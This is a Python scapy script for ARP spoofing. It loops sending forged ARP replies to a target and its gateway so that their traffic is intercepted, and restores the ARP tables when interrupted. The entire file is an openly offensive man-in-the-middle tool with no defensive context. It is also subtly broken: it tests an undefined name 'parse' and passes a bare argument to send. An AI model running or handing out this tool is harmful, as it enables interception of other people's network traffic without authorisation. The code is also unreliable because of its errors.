#Based in a0726h77
import argparse
import time
import sys

import scapy.all as scapy


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
parser.add_argument("-i", "--interface", dest="interface", help="Specify interface")


def get_mac(ip):
    scapy.conf.verb = 0
    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip)
    ans, unans = scapy.srp(packet, timeout=2, iface=arguments.interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def restore(destination_ip, source_ip):
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=get_mac(destination_ip),
        psrc=source_ip,
        hwsrc=get_mac(source_ip),
    )
    scapy.send(packet, 4)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


arguments = parser.parse_args()

if parse.gateway:
    try:
        while True:
            spoof(arguments.target, arguments.gateway)
            spoof(arguments.gateway, arguments.target)
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        restore(arguments.target,arguments.gateway)
        restore(arguments.gateway, arguments.target)
else:
    pass
